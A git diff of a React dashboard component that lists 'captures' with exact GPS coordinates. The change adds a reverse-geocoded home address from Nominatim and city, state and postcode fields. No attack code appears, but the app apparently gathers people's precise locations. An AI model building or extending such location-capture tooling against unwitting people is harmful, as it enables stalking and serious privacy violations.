@@ -349,7 +349,7 @@ export default function Dashboard() {
                                       <div className="font-body text-xs text-text-muted uppercase tracking-wider mb-1">
                                         📍 GPS Location (Exact)
                                       </div>
-                                      <div className="font-mono text-xs text-primary break-all font-bold">
+                                      <div className="font-mono text-xs text-primary font-bold">
                                         {capture.gpsLat.toFixed(6)}, {capture.gpsLon.toFixed(6)}
                                         {capture.gpsAccuracy && (
                                           <span className="text-text-muted ml-2 font-normal">
@@ -357,6 +357,19 @@ export default function Dashboard() {
                                           </span>
                                         )}
                                       </div>
+                                      {/* Full reverse-geocoded address from Nominatim */}
+                                      {capture.gpsAddress && (
+                                        <div className="font-body text-xs text-text-secondary mt-1 break-all">
+                                          🏠 {capture.gpsAddress}
+                                        </div>
+                                      )}
+                                      {/* Structured address fields */}
+                                      {(capture.gpsCity || capture.gpsState || capture.gpsPincode) && (
+                                        <div className="font-mono text-xs text-text-muted mt-0.5">
+                                          {[capture.gpsCity, capture.gpsState, capture.gpsPincode, capture.gpsCountry]
+                                            .filter(Boolean).join(", ")}
+                                        </div>
+                                      )}
                                       <a
                                         href={`https://www.google.com/maps?q=${capture.gpsLat},${capture.gpsLon}`}
                                         target="_blank"
